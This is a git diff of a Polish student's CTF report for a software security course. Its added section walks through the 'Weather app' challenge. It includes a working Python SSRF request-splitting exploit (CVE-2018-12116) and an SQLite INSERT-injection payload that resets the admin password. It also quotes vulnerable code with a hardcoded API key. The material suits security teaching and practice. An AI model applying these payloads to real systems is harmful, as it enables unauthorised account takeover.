@@ -1,4 +1,4 @@
-<center>
+<center style="fontSize:'40px'">
 ## 1. [Projekt] Zadanie 1
 **Przedmiot:** Podstawy Bezpieczeństwa Oprogramowania
 **Prowadzący:** dr inż. Ostap Hubert
@@ -75,7 +75,7 @@ const fetch = require('node-fetch');
 10. Rezultat: ![image](zad2/flag2.png)
 
 <div style="page-break-after: always"></div>
-Uwaga screeny od tego miejsca będą się różnic, ponieważ musiałem oddać mój komputer na gwarancje, i korzystam z zastępczego.
+*Uwaga screeny od tego miejsca będą się różnic, ponieważ musiałem oddać mój komputer na gwarancje, i korzystam z zastępczego.*
 
 ### 2.3 Zadanie 3
 **Nazwa:** Templated
@@ -210,6 +210,7 @@ while password[-1] != '}':
 print("Password:" + password)
 ```
 7. Rezultat: ![image](zad5/flag5.png)
+<div style="page-break-after: always"></div>
 ### 2.6 Zadanie 6
 **Nazwa:** WAFWAF
 **Punkty:** 40 
@@ -289,3 +290,80 @@ Accept-Language: en-US,en;q=0.9
 * Wykryta podatnośc prze sqlmap to tzw. `time-base blind`, czyli w momencie gdy nie otrzymujemy od serwera żadnej odpowiedzi, w postaci tekstu lub jsona możemy wstrzymywać pracę serwera na kilka sekunda jeśli podane query jest fałszywe a gdy jest prawdziwe odrazu kończyć. Atak ten przypomina atak typu booleanization ponieważ tutaj też jesteśmy zmuszeni zgadywać "literka po literce", dostajemy jedynie odpowiedz typu prawda fałsz.
 9. Rezultat:
 ![image](/zad6/zad6.png)
+
+<div style="page-break-after: always"></div>
+
+### 2.7 Zadanie 7
+**Nazwa:** Weather app
+**Punkty:** 30 
+**Flaga:** HTB{w3lc0m3_t0_th3_p1p3_dr34m}
+1. Ten challengu różni się od pozostałych tym że mamy dostęp do całego kodu serwera
+2. Analiza kodu
+   1. W pliku `database.js` widzimy podatność typu SQL INJECTION, parametry funkcji `register` nie są filtrowane.
+   ```javascript
+    let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
+    resolve((await this.db.run(query)));
+   ```
+   2. Idąc tym tropem znajduję controller metody register w pliku `index.js`, lecz sprawdza on pochodzenie żadania czy pochodzi ono od tego właśnie serwera, przez co rejstrować mogą się jedynie użytkownicy
+   ```javascript
+   router.post('/register', (req, res) => {
+
+	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
+		return res.status(401).end();
+	}
+   ```
+   3. Analizując kod dalej udaje mi się zlokalizować wywołanie requesta z serwera do api weather app, kontroler znajduję się w pliku `routes/index.js`, za to samo wywołanie w pliku `helpers/WeatherHelper.js`
+   ```javascript
+    async getWeather(res, endpoint, city, country) {
+
+     // *.openweathermap.org is out of scope
+     let apiKey = '10a62430af617a949055a46fa6dec32f';
+     let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`);
+   ```
+   Niestety zapytanie ma ustawiony na stałe URL oraz metode zapytania, czyli `GET`.
+3. Ponieważ znamy wersję głównej bilioteki, które znajdują się w pliku `package.json`, postanowiłem poszukać podatności na te konkretne wersje. Zaczynam od nodejs wpisuję w google `nodejs 8.x cv` i otrzymuję [listę podatnośći](https://www.cvedetails.com/vulnerability-list.php?vendor_id=12113&product_id=30764&version_id=218757&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=3&trc=14&sha=21abfa2a98170769e3b43f48ebf35db6ad0a1412)
+4. Udaję mi się z listy 14 podatnośći odnaleźć tą która jest właśnie tym czego potrzebujemy (`CVE-2018-12116`)
+5. Tego typu podatność nazywa się SSRF - Server Site Request Forgery i polega ono wykonywaniu zapytań jako serwer do innych zasobów, dzięki czemu uzyskujemy dostęp do wszystkich usług do których ma dostęp serwer. W naszym wypadku uzyskujemy dostęp do naszego serwer'a jak serwer co umożliwia nam atak.
+6. Szukam dokładnego opisu tej podatności, natknąłem się na orginalne zgłoszenie błędu: `https://hackerone.com/reports/409943` - wykorzystana jest podatność jako że node natwynie korzysta z kodowanie `latina-1`, czyli ucina część wykraczając poza 2 bajty, czyli znak `u{0220}` zostanie przekształcony na `u{20}`(znak spacji), co więcej poprawnie przejdzie walidacje, co pozwoli nam w jednym requescie wykonać kolejne.
+7. Wykorzystując ten fakt i znając składnie protokułu HTTP 1.1, napisałem skrypt automtyzujący cały proces
+```python
+from requests import *
+
+URL = "http://138.68.189.41:32481"
+
+def endpoint_payload(username, password):
+    username = utils.quote(username)
+    password = utils.quote(password)
+    content_length = len(username) + len(password) + 19
+
+    return """127.0.0.1/ HTTP/1.1
+Host: 127.0.0.1
+
+POST /register HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: {content_length}
+
+username={username}&password={password}
+
+GET /?qwe=""".format(content_length=content_length, username=username, password=password)
+
+def ssrify(httpFormated):
+    return httpFormated.replace("\n","\u010D\u010A").replace(" ","\u0120")
+
+def request(username, password):
+    payload = endpoint_payload(username, password)
+    ssrf_payload = ssrify(payload)
+
+    print(ssrf_payload)
+    return post(URL + '/api/weather',json={'endpoint': ssrf_payload, 'city': 'warsaw', 'country': 'poland'})
+
+res = request('admin',"password")
+
+print(res.text)
+```
+8. Obchodząc to zabezpieczenie, możemy przejść do następnego czyli SQL INJECTION w formularz rejestracji. Analizując kod widzimy, że aby uzyskać flagę musimy się zalgować na konto administratora. Jeżeli nim mamy możliwości wstrzyknięcia kodu do logowania, musimy w jakiś sposób zaktualizować hasło konta `admin`.
+9. Szukam w jaki sposób można wpisać wstrzyknać kod do dyrektywy INSERT, znajduję to źródło https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/, lecz niestety nie działa, ponieważ jest to wersja dla DBMS MySQL, w pliku `database.js` odnajduję informację, że my korzystamy z bazy danych `sqlite`, szukam a więc odpowiednika i jest polecenie: `ON CONFLICT(ip) DO UPDATE SET hits = hits + 1;`
+10. A więc query wygląda tak: `password') ON CONFLICT(username) DO UPDATE SET password = 'password';--`
+11. Następnie należy je podać w pole password funkcji `request`, zalogować się nowymi danymi, i ukaże nam się flaga.
+12. Rezultat: ![image](zad7/flag7.png)
